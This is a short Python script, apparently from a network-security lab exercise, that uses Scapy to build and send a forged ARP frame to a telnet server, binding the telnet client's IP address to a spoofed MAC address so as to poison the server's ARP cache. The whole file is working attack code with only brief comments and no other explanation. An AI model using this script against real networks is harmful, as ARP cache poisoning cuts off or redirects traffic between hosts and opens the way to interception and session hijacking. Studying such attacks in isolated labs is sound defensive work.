#!/usr/bin/python3

from scapy.all import *

#ip and mac addr for the telnet server
vic_ip_addr = "10.1.1.11"
vic_mac_addr = "08:00:27:09:fd:f7"

#ip addr of the telnet client and a spoofed mac address that does not match the client's
target_ip = "10.1.1.12"
target_mac_spoofed = "aa:bb:cc:dd:ee:ff"

#construct the ethernet frame header
ether = Ether(src = target_mac_spoofed, dst = vic_mac_addr)
#construct the arp message
arp = ARP(psrc = target_ip, hwsrc = target_mac_spoofed, 
	pdst = vic_ip_addr, hwdst = vic_mac_addr)

#construct the frame
frame = ether/arp
#send the frame
sendp(frame)

